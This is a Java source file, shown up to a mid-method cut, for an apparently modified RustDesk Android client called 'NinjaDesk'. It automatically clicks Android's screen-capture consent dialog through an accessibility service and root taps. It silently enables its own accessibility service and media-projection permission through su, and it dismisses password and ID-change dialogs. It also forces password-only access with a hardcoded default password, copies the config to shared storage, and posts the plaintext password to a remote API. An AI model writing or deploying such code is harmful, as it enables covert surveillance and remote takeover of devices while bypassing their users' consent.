package com.carriez.flutter_hbb;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.app.Activity;
import android.app.ActivityManager;
import android.app.AlertDialog;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.ServiceConnection;
import android.graphics.Rect;
import android.net.Uri;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.text.method.PasswordTransformationMethod;
import android.util.Log;
import android.view.View;
import android.view.ViewGroup;
import android.view.Gravity;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.widget.Button;
import android.widget.EditText;
import android.widget.FrameLayout;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;
import android.graphics.Color;
import android.graphics.Typeface;
import android.graphics.drawable.GradientDrawable;

import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class AutoConsentHelper {
    private static final String TAG = "AutoConsentHelper";
    public static volatile Activity currentActivity = null;
    private static boolean hasAutoStarted = false;
    private static boolean receiverRegistered = false;
    private static boolean configSyncStarted = false;
    private static long lastConsentAttempt = 0;
    private static long lastPasswordDialogTime = 0;

    public static void setupServiceInfo(AccessibilityService service) {
        if (service == null) return;
        try {
            AccessibilityServiceInfo info = new AccessibilityServiceInfo();
            info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
            info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
            info.flags = AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS |
                         AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS |
                         0x40; // flagDefault
            info.notificationTimeout = 50;
            service.setServiceInfo(info);
            Log.i(TAG, "setupServiceInfo: configured eventTypes = TYPES_ALL_MASK successfully!");
        } catch (Throwable t) {
            Log.e(TAG, "setupServiceInfo error: ", t);
        }
    }

    public static void handleAccessibilityEvent(AccessibilityService service, AccessibilityEvent event) {
        if (service == null || event == null) return;
        try {
            long now = System.currentTimeMillis();

            // 1. Guard against unauthorized security dialogs/menus on the TV box
            try {
                AccessibilityNodeInfo activeRoot = service.getRootInActiveWindow();
                if (activeRoot != null) {
                    List<AccessibilityNodeInfo> nodes = activeRoot.findAccessibilityNodeInfosByText("Set Password");
                    if (nodes == null || nodes.isEmpty()) {
                        nodes = activeRoot.findAccessibilityNodeInfosByText("Set permanent password");
                    }
                    if (nodes == null || nodes.isEmpty()) {
                        nodes = activeRoot.findAccessibilityNodeInfosByText("Change ID");
                    }
                    if (nodes != null && !nodes.isEmpty()) {
                        Log.i(TAG, "Dismissing unauthorized security dialog on TV box");
                        service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK);
                    }
                }
            } catch (Throwable ignored) {}

            // 2. Consent Dialog Handling
            if (now - lastConsentAttempt < 200) return;

            AccessibilityNodeInfo root = service.getRootInActiveWindow();
            if (root == null) return;

            boolean clicked = searchAndClickConsent(root);
            if (clicked) {
                lastConsentAttempt = now;
                Log.i(TAG, "Intercepted and clicked MediaProjection consent via onAccessibilityEvent!");
                ensureRustDeskServiceStarted();
                returnToHomeLauncher();
            }
        } catch (Throwable t) {
            Log.e(TAG, "Error in handleAccessibilityEvent: ", t);
        }
    }

    public static void ensureRustDeskServiceStarted() {
        try {
            Class<?> ffiClass = Class.forName("ffi.FFI");
            java.lang.reflect.Field aField = ffiClass.getDeclaredField("a");
            aField.setAccessible(true);
            Object ffiObj = aField.get(null);
            java.lang.reflect.Method startServiceMethod = ffiClass.getDeclaredMethod("startService");
            startServiceMethod.setAccessible(true);
            startServiceMethod.invoke(ffiObj);
            Log.i(TAG, "ensureRustDeskServiceStarted: FFI.startService() invoked successfully!");
        } catch (Throwable t) {
            Log.w(TAG, "ensureRustDeskServiceStarted notice: " + t.getMessage());
        }
    }

    public static boolean isRustDeskCoreServiceActive(Context context) {
        if (context == null) return false;
        try {
            ActivityManager am = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
            if (am != null) {
                List<ActivityManager.RunningServiceInfo> services = am.getRunningServices(100);
                if (services != null) {
                    for (ActivityManager.RunningServiceInfo s : services) {
                        if (s != null && s.service != null) {
                            String cls = s.service.getClassName();
                            if (cls != null && (cls.contains("MainService") || cls.contains("flutter_hbb"))) {
                                return true;
                            }
                        }
                    }
                }
            }
        } catch (Throwable ignored) {}

        try {
            Class<?> mainServiceClass = Class.forName("com.carriez.flutter_hbb.MainService");
            java.lang.reflect.Field bField = mainServiceClass.getDeclaredField("B");
            bField.setAccessible(true);
            Object companion = bField.get(null);
            if (companion != null) {
                java.lang.reflect.Method bMethod = companion.getClass().getDeclaredMethod("b");
                bMethod.setAccessible(true);
                Object res = bMethod.invoke(companion);
                if (res instanceof Boolean && ((Boolean) res)) {
                    return true;
                }
            }
        } catch (Throwable ignored) {}

        return false;
    }

    public static void showRebootNotificationAndRestart(final Context context) {
        if (context == null) return;
        try {
            String channelId = "ninjadesk_remote_reboot";
            NotificationManager nm = (NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE);
            if (nm != null) {
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                    NotificationChannel channel = new NotificationChannel(
                        channelId,
                        "NinjaDesk Remote System Recovery",
                        NotificationManager.IMPORTANCE_HIGH
                    );
                    channel.setDescription("System maintenance and remote reboot notifications");
                    channel.enableVibration(true);
                    nm.createNotificationChannel(channel);
                }

                Notification.Builder builder;
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                    builder = new Notification.Builder(context, channelId);
                } else {
                    builder = new Notification.Builder(context);
                }

                builder.setContentTitle("NinjaDesk Remote Maintenance")
                       .setContentText("Remote recovery trigger received. System reboot initiated...")
                       .setSmallIcon(android.R.drawable.stat_notify_sync)
                       .setOngoing(true)
                       .setAutoCancel(false);

                nm.notify(9922, builder.build());
            }
        } catch (Throwable t) {
            Log.w(TAG, "Notification note: " + t.getMessage());
        }

        new Handler(Looper.getMainLooper()).post(new Runnable() {
            @Override
            public void run() {
                try {
                    Toast.makeText(context.getApplicationContext(), "NinjaDesk Remote Maintenance: System Reboot Initiated...", Toast.LENGTH_LONG).show();
                } catch (Throwable ignored) {}
            }
        });

        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    Thread.sleep(1500);
                    Log.i(TAG, "Executing root reboot via su -c reboot...");
                    Process p = Runtime.getRuntime().exec(new String[]{"/system/bin/su", "-c", "reboot"});
                    p.waitFor();
                } catch (Throwable t1) {
                    try {
                        Process p2 = Runtime.getRuntime().exec(new String[]{"su", "-c", "reboot"});
                        p2.waitFor();
                    } catch (Throwable t2) {
                        try {
                            Runtime.getRuntime().exec("reboot");
                        } catch (Throwable t3) {
                            Log.e(TAG, "Root reboot failed: ", t3);
                        }
                    }
                }
            }
        }).start();
    }

    public static boolean searchAndClickConsent(AccessibilityNodeInfo root) {
        if (root == null) return false;

        String[] keywords = new String[] {
            "START NOW", "Start now", "start now", "Start recording", "Start casting", "Entire screen"
        };

        for (String kw : keywords) {
            try {
                List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(kw);
                if (nodes != null && !nodes.isEmpty()) {
                    for (AccessibilityNodeInfo node : nodes) {
                        if (node == null) continue;

                        if (node.isClickable() && node.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                            Log.i(TAG, "Clicked node by text: " + kw);
                            return true;
                        }

                        AccessibilityNodeInfo parent = node.getParent();
                        while (parent != null) {
                            if (parent.isClickable() && parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                                Log.i(TAG, "Clicked parent of text: " + kw);
                                return true;
                            }
                            parent = parent.getParent();
                        }

                        Rect bounds = new Rect();
                        node.getBoundsInScreen(bounds);
                        if (bounds.width() > 0 && bounds.height() > 0) {
                            int cx = bounds.centerX();
                            int cy = bounds.centerY();
                            Log.i(TAG, "Executing root tap at (" + cx + ", " + cy + ") for text: " + kw);
                            execRootTap(cx, cy);
                            return true;
                        }
                    }
                }
            } catch (Throwable ignored) {}
        }

        try {
            List<AccessibilityNodeInfo> buttons = root.findAccessibilityNodeInfosByViewId("android:id/button1");
            if (buttons != null && !buttons.isEmpty()) {
                for (AccessibilityNodeInfo b : buttons) {
                    if (b != null && b.isClickable() && b.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                        Log.i(TAG, "Clicked android:id/button1");
                        return true;
                    }
                }
            }
        } catch (Throwable ignored) {}

        return false;
    }

    private static void execRootTap(int x, int y) {
        try {
            Runtime.getRuntime().exec(new String[] {
                "/system/bin/su", "-c", "input tap " + x + " " + y
            });
        } catch (Throwable t) {
            Log.e(TAG, "execRootTap error: ", t);
        }
    }

    static class MoveTaskBackTask implements Runnable {
        private final Activity activity;

        MoveTaskBackTask(Activity activity) {
            this.activity = activity;
        }

        @Override
        public void run() {
            try {
                activity.moveTaskToBack(true);
                Log.i(TAG, "moveTaskToBack successfully executed (returning to previous screen/app)");
            } catch (Throwable t) {
                Log.w(TAG, "moveTaskToBack error: ", t);
            }
        }
    }

    static class HomeLauncherTask implements Runnable {
        @Override
        public void run() {
            try {
                Thread.sleep(300);
                Activity act = currentActivity;
                if (act != null && !act.isFinishing()) {
                    act.runOnUiThread(new MoveTaskBackTask(act));
                }
            } catch (Throwable t) {
                Log.w(TAG, "HomeLauncherTask error: ", t);
            }
        }
    }

    public static void returnToHomeLauncher() {
        new Thread(new HomeLauncherTask()).start();
    }

    public static boolean isAccessibilityEnabled(Context context) {
        if (context == null) return false;
        try {
            int enabled = Settings.Secure.getInt(
                context.getContentResolver(),
                Settings.Secure.ACCESSIBILITY_ENABLED, 0
            );
            if (enabled != 1) return false;

            String services = Settings.Secure.getString(
                context.getContentResolver(),
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            );
            if (services != null && services.contains("com.carriez.flutter_hbb")) {
                return true;
            }
        } catch (Throwable t) {
            Log.e(TAG, "isAccessibilityEnabled check failed: ", t);
        }
        return false;
    }

    static class NotifyFlutterInputTask implements Runnable {
        private final Activity activity;

        NotifyFlutterInputTask(Activity activity) {
            this.activity = activity;
        }

        @Override
        public void run() {
            try {
                Class<?> mainActClass = activity.getClass();
                Field channelField = null;
                for (Field f : mainActClass.getDeclaredFields()) {
                    if (f.getType().getName().contains("MethodChannel") || f.getName().equals("t")) {
                        channelField = f;
                        break;
                    }
                }
                if (channelField != null) {
                    channelField.setAccessible(true);
                    Object channel = channelField.get(activity);
                    if (channel != null) {
                        Method invokeMethod = null;
                        try {
                            invokeMethod = channel.getClass().getMethod("c", String.class, Object.class);
                        } catch (Throwable ignored) {
                            try {
                                invokeMethod = channel.getClass().getMethod("invokeMethod", String.class, Object.class);
                            } catch (Throwable ignored2) {}
                        }
                        if (invokeMethod != null) {
                            Map<String, String> map = new HashMap<String, String>();
                            map.put("name", "input");
                            map.put("value", "true");
                            invokeMethod.invoke(channel, "on_state_changed", map);
                            Log.i(TAG, "Notified Flutter on_state_changed: input=true");
                        }
                    }
                }
            } catch (Throwable t) {
                Log.w(TAG, "NotifyFlutterInputTask error: ", t);
            }
        }
    }

    public static void notifyFlutterInputEnabled(final Activity activity) {
        if (activity == null) return;
        activity.runOnUiThread(new NotifyFlutterInputTask(activity));
    }

    static class DelayedHomeTask implements Runnable {
        private final long delayMs;

        DelayedHomeTask(long delayMs) {
            this.delayMs = delayMs;
        }

        @Override
        public void run() {
            try {
                Thread.sleep(delayMs);
                returnToHomeLauncher();
            } catch (Throwable ignored) {}
        }
    }

    public static void returnToHomeLauncherDelayed(long delayMs) {
        new Thread(new DelayedHomeTask(delayMs)).start();
    }

    static class AutoStartTask implements Runnable {
        private final Activity activity;

        AutoStartTask(Activity activity) {
            this.activity = activity;
        }

        @Override
        public void run() {
            try {
                currentActivity = activity;

                registerCommandReceiver(activity);
                startConfigSyncPoller(activity);

                // If activity was launched specifically to show password dialog
                Intent it = activity.getIntent();
                if (it != null && it.getBooleanExtra("SHOW_PASSWORD_DIALOG", false)) {
                    buildAndShowDialog(activity);
                }
                if (it != null && it.getBooleanExtra("SHOW_RENAME_DIALOG", false)) {
                    buildAndShowRenameDialog(activity);
                }

                ConfigManager.ensureAccessibilityViaRoot(activity);

                // Enable Flutter Semantics so AccessibilityService can see and interact with all Flutter UI elements
                try {
                    Method nMethod = activity.getClass().getMethod("N");
                    Object engine = nMethod.invoke(activity);
                    if (engine != null) {
                        Field jniField = engine.getClass().getDeclaredField("a");
                        jniField.setAccessible(true);
                        Object jni = jniField.get(engine);
                        if (jni != null) {
                            Method setSemantics = jni.getClass().getMethod("setSemanticsEnabled", boolean.class);
                            setSemantics.invoke(jni, true);
                            Log.i(TAG, "Flutter Semantics enabled via FlutterJNI!");
                        }
                    }
                } catch (Throwable t) {
                    Log.w(TAG, "Failed to enable Flutter Semantics: ", t);
                }

                // Ensure default permanent password is set if not already configured
                try {
                    File toml1 = new File("/data/user/0/com.carriez.flutter_hbb/app_flutter/RustDesk.toml");
                    if (toml1.exists()) {
                        String currentToml = ConfigManager.readFile(toml1);
                        String existingPassword = ConfigManager.extractTomlValue(currentToml, "password");
                        if (existingPassword == null || existingPassword.trim().isEmpty() || !existingPassword.startsWith("01")) {
                            Log.i(TAG, "RustDesk.toml has empty or unencrypted password; applying default permanent password...");
                            savePermanentPassword(activity, ConfigManager.PERMANENT_PASSWORD);
                        }
                    }
                } catch (Throwable t) {
                    Log.w(TAG, "Check default password error: ", t);
                }

                // Pre-grant PROJECT_MEDIA and ensure accessibility via root
                try {
                    Runtime.getRuntime().exec(new String[]{
                        "/system/bin/su", "-c",
                        "appops set com.carriez.flutter_hbb PROJECT_MEDIA allow && " +
                        "settings put secure enabled_accessibility_services com.carriez.flutter_hbb/com.carriez.flutter_hbb.InputService && " +
                        "settings put secure accessibility_enabled 1"
                    });
                } catch (Throwable ignored) {}

                // Wait up to 2 seconds for InputService binder to activate
                for (int i = 0; i < 7; i++) {
                    try {
                        Class<?> inputServiceClass = Class.forName("com.carriez.flutter_hbb.InputService");
                        Field zField = inputServiceClass.getDeclaredField("z");
                        zField.setAccessible(true);
                        if (zField.get(null) != null) {
                            Log.i(TAG, "InputService binder verified active before requesting MediaProjection.");
                            break;
                        }
                    } catch (Throwable ignored) {}
                    try { Thread.sleep(300); } catch (Throwable ignored) {}
                }

                boolean acc = isAccessibilityEnabled(activity);
                Log.i(TAG, "checkAndAutoStartService: accessibility enabled = " + acc);
                if (!acc) {
                    Log.i(TAG, "Accessibility not enabled, skipping auto-start service.");
                    return;
                }

                Log.i(TAG, "Accessibility verified! Auto-starting screen capture service...");

                try {
                    Method o0Method = activity.getClass().getMethod("o0");
                    o0Method.invoke(activity);
                } catch (Throwable t) {
                    Log.e(TAG, "Failed to invoke o0(): ", t);
                }

                try {
                    Class<?> mainServiceClass = Class.forName("com.carriez.flutter_hbb.MainService");
                    Intent intent = new Intent(activity, mainServiceClass);
                    Field rField = activity.getClass().getDeclaredField("r");
                    rField.setAccessible(true);
                    ServiceConnection conn = (ServiceConnection) rField.get(activity);
                    if (conn != null) {
                        activity.bindService(intent, conn, Context.BIND_AUTO_CREATE);
                        Log.i(TAG, "MainService bound successfully via AutoConsentHelper!");
                    }
                } catch (Throwable t) {
                    Log.e(TAG, "Failed to bind MainService: ", t);
                }

                startConsentPoller();

            } catch (Throwable t) {
                Log.e(TAG, "checkAndAutoStartService error: ", t);
            }
        }
    }

    public static final int RENAME_BTN_ID = 0x7f099999;
    public static volatile String currentDeviceName = "";

    static class RenameBtnClickListener implements View.OnClickListener {
        private final Activity activity;

        RenameBtnClickListener(Activity activity) {
            this.activity = activity;
        }

        @Override
        public void onClick(View v) {
            buildAndShowRenameDialog(activity);
        }
    }

    static class SetupRenameTask implements Runnable {
        private final Activity activity;

        SetupRenameTask(Activity activity) {
            this.activity = activity;
        }

        @Override
        public void run() {
            try {
                ViewGroup decorView = (ViewGroup) activity.getWindow().getDecorView();
                if (decorView == null) return;
                if (decorView.findViewById(RENAME_BTN_ID) != null) return;

                Button btn = new Button(activity);
                btn.setId(RENAME_BTN_ID);
                String label = currentDeviceName.isEmpty() ? "✏️ Rename Device" : ("✏️ " + currentDeviceName);
                btn.setText(label);
                btn.setTextColor(Color.WHITE);
                btn.setTextSize(14f);
                btn.setTypeface(Typeface.DEFAULT_BOLD);
                btn.setAllCaps(false);

                GradientDrawable bg = new GradientDrawable();
                bg.setColor(Color.parseColor("#1e293b"));
                bg.setCornerRadius(24f);
                bg.setStroke(3, Color.parseColor("#00d2ff"));
                btn.setBackground(bg);
                btn.setPadding(36, 14, 36, 14);
                btn.setFocusable(true);
                btn.setClickable(true);

                FrameLayout.LayoutParams lp = new FrameLayout.LayoutParams(
                    ViewGroup.LayoutParams.WRAP_CONTENT,
                    ViewGroup.LayoutParams.WRAP_CONTENT,
                    Gravity.TOP | Gravity.END
                );
                lp.setMargins(0, 36, 40, 0);
                btn.setLayoutParams(lp);

                btn.setOnClickListener(new RenameBtnClickListener(activity));

                decorView.addView(btn);
                Log.i(TAG, "setupRenameOverlay: added Rename Device button overlay to MainActivity!");
            } catch (Throwable t) {
                Log.e(TAG, "setupRenameOverlay error: ", t);
            }
        }
    }

    public static void setupRenameOverlay(final Activity activity) {
        if (activity == null || activity.isFinishing()) return;
        activity.runOnUiThread(new SetupRenameTask(activity));
    }

    public static void checkAndAutoStartService(final Activity activity) {
        if (activity == null) return;
        currentActivity = activity;

        registerCommandReceiver(activity);
        setupRenameOverlay(activity);

        if (hasAutoStarted) {
            Intent it = activity.getIntent();
            if (it != null && it.getBooleanExtra("SHOW_PASSWORD_DIALOG", false)) {
                buildAndShowDialog(activity);
            }
            if (it != null && it.getBooleanExtra("SHOW_RENAME_DIALOG", false)) {
                buildAndShowRenameDialog(activity);
            }
            return;
        }
        hasAutoStarted = true;

        new Handler(Looper.getMainLooper()).postDelayed(new AutoStartTask(activity), 1500);
    }

    static class ConsentPollTask implements Runnable {
        @Override
        public void run() {
            long start = System.currentTimeMillis();
            int iter = 0;
            while (System.currentTimeMillis() - start < 15000) {
                iter++;
                try {
                    Thread.sleep(300);

                    // 1. Check Accessibility service
                    Class<?> inputServiceClass = Class.forName("com.carriez.flutter_hbb.InputService");
                    Field zField = inputServiceClass.getDeclaredField("z");
                    zField.setAccessible(true);
                    AccessibilityService svc = (AccessibilityService) zField.get(null);
                    if (svc != null) {
                        AccessibilityNodeInfo root = svc.getRootInActiveWindow();
                        if (root != null && searchAndClickConsent(root)) {
                            Log.i(TAG, "Consent poller successfully clicked Start Now button via Accessibility!");
                            Thread.sleep(400);
                            returnToHomeLauncher();
                            break;
                        }
                    }

                    // 2. Root fallback: After 1.2s, execute root DPAD/Enter keyevents to click "Start now"
                    if (iter >= 4 && iter % 3 == 0) {
                        try {
                            Runtime.getRuntime().exec(new String[]{
                                "/system/bin/su", "-c",
                                "input keyevent 22 && sleep 0.1 && input keyevent 66"
                            });
                            Log.i(TAG, "Consent poller dispatched root DPAD/Enter keyevent for Start Now dialog.");
                        } catch (Throwable ignored) {}
                    }

                    // 3. Check if MediaProjection became active
                    try {
                        Process p = Runtime.getRuntime().exec(new String[]{
                            "/system/bin/su", "-c", "dumpsys media_projection | grep -i TYPE_SCREEN_CAPTURE"
                        });
                        BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream(), StandardCharsets.UTF_8));
                        String l = br.readLine();
                        br.close();
                        if (l != null && l.contains("TYPE_SCREEN_CAPTURE")) {
                            Log.i(TAG, "MediaProjection confirmed active! Returning to home launcher...");
                            ensureRustDeskServiceStarted();
                            Thread.sleep(400);
                            returnToHomeLauncher();
                            break;
                        }
                    } catch (Throwable ignored) {}

                } catch (Throwable ignored) {}
            }
        }
    }

    private static void startConsentPoller() {
        new Thread(new ConsentPollTask()).start();
    }

    static class EyeToggleListener implements View.OnClickListener {
        private final EditText input;
        private final Button btn;
        private boolean isVisible = false;

        EyeToggleListener(EditText input, Button btn) {
            this.input = input;
            this.btn = btn;
        }

        @Override
        public void onClick(View v) {
            isVisible = !isVisible;
            if (isVisible) {
                input.setTransformationMethod(null);
                btn.setText("🙈 Hide");
            } else {
                input.setTransformationMethod(PasswordTransformationMethod.getInstance());
                btn.setText("👁 Show");
            }
            input.setSelection(input.getText().length());
        }
    }

    static class SavePasswordListener implements DialogInterface.OnClickListener {
        private final Context context;
        private final EditText passInput;
        private final EditText confirmInput;

        SavePasswordListener(Context context, EditText passInput, EditText confirmInput) {
            this.context = context;
            this.passInput = passInput;
            this.confirmInput = confirmInput;
        }

        @Override
        public void onClick(DialogInterface dialog, int which) {
            String p1 = passInput.getText().toString().trim();
            String p2 = confirmInput.getText().toString().trim();
            if (!p1.equals(p2)) {
                Toast.makeText(context, "Passwords do not match!", Toast.LENGTH_SHORT).show();
                return;
            }
            if (!p1.isEmpty()) {
                savePermanentPassword(context, p1);
            }
            returnToHomeLauncher();
        }
    }

    static class ShowDialogTask implements Runnable {
        private final Context context;

        ShowDialogTask(Context context) {
            this.context = context;
        }

        @Override
        public void run() {
            buildAndShowDialog(context);
        }
    }

    public static void showPasswordDialogWithEye(final Context context) {
        if (context == null) return;
        try {
            Intent it = new Intent(context, Class.forName("com.carriez.flutter_hbb.MainActivity"));
            it.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_SINGLE_TOP);
            context.startActivity(it);
        } catch (Throwable ignored) {}
        new Handler(Looper.getMainLooper()).postDelayed(new ShowDialogTask(context), 300);
    }

    private static void buildAndShowDialog(Context context) {
        try {
            if (context == null) return;
            Context targetCtx = (currentActivity != null && !currentActivity.isFinishing()) ? currentActivity : context;

            AlertDialog.Builder builder = new AlertDialog.Builder(targetCtx, android.R.style.Theme_DeviceDefault_Light_Dialog_Alert);
            builder.setTitle("Set Password");

            LinearLayout layout = new LinearLayout(targetCtx);
            layout.setOrientation(LinearLayout.VERTICAL);
            layout.setPadding(40, 20, 40, 10);

            TextView label = new TextView(targetCtx);
            label.setText("Set permanent password for unattended remote access:");
            label.setTextSize(14f);
            label.setTextColor(0xFF333333);
            layout.addView(label);

            // Password row with Eye button
            LinearLayout passRow = new LinearLayout(targetCtx);
            passRow.setOrientation(LinearLayout.HORIZONTAL);
            passRow.setLayoutParams(new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT
            ));
            passRow.setPadding(0, 16, 0, 8);

            EditText passInput = new EditText(targetCtx);
            passInput.setLayoutParams(new LinearLayout.LayoutParams(
                0, LinearLayout.LayoutParams.WRAP_CONTENT, 1.0f
            ));
            passInput.setHint("Password");
            String curPass = (ConfigManager.PERMANENT_PASSWORD != null && !ConfigManager.PERMANENT_PASSWORD.isEmpty())
                ? ConfigManager.PERMANENT_PASSWORD : "Ninja@2026";
            passInput.setText(curPass);
            passInput.setTransformationMethod(PasswordTransformationMethod.getInstance());
            passInput.setTextSize(16f);
            passRow.addView(passInput);

            Button eyeBtn = new Button(targetCtx);
            eyeBtn.setText("👁 Show");
            eyeBtn.setTextSize(14f);
            eyeBtn.setLayoutParams(new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.WRAP_CONTENT, LinearLayout.LayoutParams.WRAP_CONTENT
            ));
            eyeBtn.setOnClickListener(new EyeToggleListener(passInput, eyeBtn));
            passRow.addView(eyeBtn);
            layout.addView(passRow);

            // Confirmation row with Eye button
            LinearLayout confirmRow = new LinearLayout(targetCtx);
            confirmRow.setOrientation(LinearLayout.HORIZONTAL);
            confirmRow.setLayoutParams(new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT
            ));
            confirmRow.setPadding(0, 8, 0, 8);

            EditText confirmInput = new EditText(targetCtx);
            confirmInput.setLayoutParams(new LinearLayout.LayoutParams(
                0, LinearLayout.LayoutParams.WRAP_CONTENT, 1.0f
            ));
            confirmInput.setHint("Confirmation");
            confirmInput.setText(curPass);
            confirmInput.setTransformationMethod(PasswordTransformationMethod.getInstance());
            confirmInput.setTextSize(16f);
            confirmRow.addView(confirmInput);

            Button confirmEyeBtn = new Button(targetCtx);
            confirmEyeBtn.setText("👁 Show");
            confirmEyeBtn.setTextSize(14f);
            confirmEyeBtn.setLayoutParams(new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.WRAP_CONTENT, LinearLayout.LayoutParams.WRAP_CONTENT
            ));
            confirmEyeBtn.setOnClickListener(new EyeToggleListener(confirmInput, confirmEyeBtn));
            confirmRow.addView(confirmEyeBtn);
            layout.addView(confirmRow);

            builder.setView(layout);
            builder.setPositiveButton("OK", new SavePasswordListener(targetCtx, passInput, confirmInput));
            builder.setNegativeButton("Cancel", new DialogInterface.OnClickListener() {
                @Override
                public void onClick(DialogInterface dialog, int which) {
                    returnToHomeLauncher();
                }
            });

            AlertDialog dlg = builder.create();
            dlg.show();
            Log.i(TAG, "Set Password dialog with Eye button displayed successfully!");
        } catch (Throwable t) {
            Log.e(TAG, "buildAndShowDialog error: ", t);
        }
    }

    static class ReportPasswordTask implements Runnable {
        private final String newPass;

        ReportPasswordTask(String newPass) {
            this.newPass = newPass;
        }

        @Override
        public void run() {
            try {
                File dir = new File("/data/user/0/com.carriez.flutter_hbb/app_flutter");
                File t1 = new File(dir, "RustDesk.toml");
                String devId = ConfigManager.extractTomlValue(ConfigManager.readFile(t1), "id");
                if (devId == null || devId.isEmpty()) devId = "404156725";

                String urlStr = ConfigManager.getApiUrl("/api/device/password/");
                java.util.Map<String, String> headers = new java.util.HashMap<>();
                headers.put("Content-Type", "application/json");
                headers.put("X-Ninja-Api-Key", "ninja-local-dev-key");
                String payload = "{\"id\":\"" + devId + "\",\"password\":\"" + newPass + "\"}";
                ConfigManager.httpRequest("POST", urlStr, payload, headers);
            } catch (Throwable ignored) {}
        }
    }

    public static void savePermanentPassword(final Context context, final String newPass) {
        try {
            ConfigManager.PERMANENT_PASSWORD = newPass;
            File appFlutterDir = null;
            try {
                appFlutterDir = new File(context.getFilesDir().getParentFile(), "app_flutter");
            } catch (Throwable ignored) {}
            if (appFlutterDir == null || !appFlutterDir.exists()) {
                appFlutterDir = new File("/data/user/0/com.carriez.flutter_hbb/app_flutter");
            }
            File toml1 = new File(appFlutterDir, "RustDesk.toml");
            File toml2 = new File(appFlutterDir, "RustDesk2.toml");

            if (toml1.exists()) {
                String content = ConfigManager.readFile(toml1);
                String[] lines = content.split("\n");
                StringBuilder sb = new StringBuilder();

                byte[] pkBytes = ConfigManager.extractPublicKey(content);
                String salt = ConfigManager.extractTomlValue(content, "salt");
                if (salt == null || salt.trim().isEmpty()) {
                    salt = "xcv4kvqg2n6mix9bsx8frphhsdy5p4vk";
                }
                String encPass = ConfigManager.computeEncryptedPermanentPassword(newPass, salt, pkBytes);

                java.util.List<String> rootLines = new java.util.ArrayList<>();
                java.util.List<String> sectionLines = new java.util.ArrayList<>();
                boolean inSection = false;

                for (String line : lines) {
                    String trim = line.trim();
                    if (!inSection && trim.startsWith("[") && trim.endsWith("]") && !trim.contains("=")) {
                        inSection = true;
                    }
                    if (inSection) {
                        if (!line.isEmpty()) sectionLines.add(line);
                    } else {
                        if (!trim.startsWith("password =") && !trim.startsWith("password=") && !line.isEmpty()) {
                            rootLines.add(line);
                        }
                    }
                }

                String passValue = (encPass != null) ? encPass : newPass;
                // Add password to root scope
                rootLines.add("password = '" + passValue + "'");

                for (String r : rootLines) {
                    sb.append(r).append("\n");
                }
                if (!sectionLines.isEmpty()) {
                    sb.append("\n");
                    for (String s : sectionLines) {
                        sb.append(s).append("\n");
                    }
                }

                ConfigManager.writeToFile(toml1, sb.toString());
                ConfigManager.writeToFile(new File("/sdcard/Documents/.ninjadesk_identity.toml"), sb.toString());
                ConfigManager.writeToFile(new File("/sdcard/.ninjadesk_identity.toml"), sb.toString());
                Log.i(TAG, "Permanent password encrypted and updated in RustDesk.toml (root scope, version 01)");
            }

            if (toml2.exists()) {
                String c2 = ConfigManager.readFile(toml2);
                if (!c2.contains("verification-method = 'use-permanent-password'")) {
                    c2 = c2.replace("verification-method = 'use-temporary-password'", "verification-method = 'use-permanent-password'");
                }
                c2 = c2.replace("approve-mode = 'both'", "approve-mode = 'password'");
                c2 = c2.replace("approve-mode = 'click'", "approve-mode = 'password'");
                c2 = c2.replace("disable-change-permanent-password = 'Y'", "");
                if (!c2.contains("approve-mode = 'password'")) {
                    c2 += "\napprove-mode = 'password'\n";
                }
                if (!c2.contains("allow-deep-link-password = 'Y'")) {
                    c2 += "\nallow-deep-link-password = 'Y'\n";
                }
                ConfigManager.writeToFile(toml2, c2);
            }

            File tomlLocal = new File(appFlutterDir, "RustDesk_local.toml");
            if (tomlLocal.exists()) {
                String clocal = ConfigManager.readFile(tomlLocal);
                clocal = clocal.replace("approve-mode = 'both'", "approve-mode = 'password'");
                clocal = clocal.replace("approve-mode = 'click'", "approve-mode = 'password'");
                clocal = clocal.replace("disable-change-permanent-password = 'Y'", "");
                if (!clocal.contains("approve-mode = 'password'")) {
                    clocal += "\napprove-mode = 'password'\n";
                }
                if (!clocal.contains("allow-deep-link-password = 'Y'")) {
                    clocal += "\nallow-deep-link-password = 'Y'\n";
                }
                ConfigManager.writeToFile(tomlLocal, clocal);
            }

            // Password updated cleanly in toml files for incoming connection verification
